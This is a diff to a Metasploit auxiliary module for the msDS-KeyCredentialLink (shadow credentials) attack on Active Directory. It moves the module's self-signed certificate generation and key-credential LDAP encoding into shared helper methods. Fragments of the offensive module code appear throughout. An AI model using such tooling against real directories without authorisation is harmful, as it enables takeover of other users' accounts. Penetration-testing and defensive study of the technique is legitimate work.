@@ -7,6 +7,7 @@ class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::LDAP::ActiveDirectory
+  include Msf::Exploit::Remote::LDAP::ActiveDirectoryAttributeBuilders
   include Msf::OptionalSession::LDAP
 
   ATTRIBUTE = 'msDS-KeyCredentialLink'.freeze
@@ -248,7 +249,9 @@ class MetasploitModule < Msf::Auxiliary
       credential_entries = format_ldap_to_credentials(entries)
     end
 
-    key, cert = generate_key_and_cert(datastore['TARGET_USER'])
+    material = generate_key_and_cert(datastore['TARGET_USER'])
+    key = material[:private_key]
+    cert = material[:certificate]
     credential = Rex::Proto::MsAdts::KeyCredential.new
     credential.set_key(key.public_key, Rex::Proto::MsAdts::KeyCredential::KEY_USAGE_NGC)
     now = ::Time.now
@@ -304,12 +307,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def format_credentials_to_ldap(entries, dn)
-    entries.map do |entry|
-      struct = entry.to_struct
-      dn_binary = Rex::Proto::LDAP::DnBinary.new(dn, struct.to_binary_s)
-
-      dn_binary.encode
-    end
+    adds_format_key_credentials_to_ldap(entries, dn)
   end
 
   def format_ldap_to_credentials(entries)
@@ -321,16 +319,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def generate_key_and_cert(subject)
-    key = OpenSSL::PKey::RSA.new(2048)
-    cert = OpenSSL::X509::Certificate.new
-    cert.public_key = key.public_key
-    cert.issuer = OpenSSL::X509::Name.new([['CN', subject]])
-    cert.subject = OpenSSL::X509::Name.new([['CN', subject]])
-    yr = 24 * 3600 * 365
-    cert.not_before = Time.at(Time.now.to_i - rand(yr * 3) - yr)
-    cert.not_after = Time.at(cert.not_before.to_i + (rand(4..9) * yr))
-    cert.sign(key, OpenSSL::Digest.new('SHA256'))
-
-    [key, cert]
+    adds_generate_x509_certificate(subject)
   end
 end
